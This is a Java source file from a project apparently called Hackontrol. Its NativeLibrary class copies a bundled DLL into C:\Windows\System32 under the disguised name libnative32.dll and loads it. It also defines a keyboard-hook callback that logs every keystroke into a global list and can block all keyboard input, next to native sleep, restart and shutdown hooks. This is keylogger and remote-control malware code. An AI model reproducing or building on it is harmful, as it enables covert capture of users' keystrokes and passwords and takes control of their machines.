package com.khopan.hackontrol;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class NativeLibrary {
	private NativeLibrary() {}

	public static final List<KeyEntry> KEYSTROKE_LIST = new ArrayList<>();
	public static final Map<Integer, Boolean> KEYSTROKE_MAP = new HashMap<>();

	public static boolean Block = false;
	public static boolean Enable = false;

	public static native String sleep();
	public static native String hibernate();
	public static native String restart();
	public static native String shutdown();

	public static void load() {
		try {
			InputStream inputStream = NativeLibrary.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
			byte[] data = inputStream.readAllBytes();
			inputStream.close();
			File file = new File("C:\\Windows\\System32\\libnative32.dll");
			FileOutputStream outputStream = new FileOutputStream(file);
			outputStream.write(data);
			outputStream.close();
			System.load(file.getAbsolutePath());
		} catch(Throwable Errors) {
			Errors.printStackTrace();
		}
	}

	private static boolean log(int keyAction, int keyCode, int scanCode, int flags, int time) {
		if(!NativeLibrary.Enable) {
			return NativeLibrary.Block;
		}

		KeyEntry entry = new KeyEntry();

		switch(keyAction) {
		case 0x0100:
			entry.keyDown = true;
			entry.systemKey = false;
			break;
		case 0x0101:
			entry.keyDown = false;
			entry.systemKey = false;
			break;
		case 0x0104:
			entry.keyDown = true;
			entry.systemKey = true;
			break;
		case 0x0105:
			entry.keyDown = false;
			entry.systemKey = true;
			break;
		}

		entry.keyCode = keyCode;
		entry.scanCode = scanCode;
		Boolean value = NativeLibrary.KEYSTROKE_MAP.get(scanCode);
		boolean previousState = value == null ? false : value;
		entry.fake = previousState == entry.keyDown;
		NativeLibrary.KEYSTROKE_MAP.put(scanCode, entry.keyDown);
		NativeLibrary.KEYSTROKE_LIST.add(entry);
		return NativeLibrary.Block;
	}

	public static class KeyEntry {
		public boolean keyDown;
		public boolean systemKey;
		public int keyCode;
		public int scanCode;
		public boolean fake;
	}
}
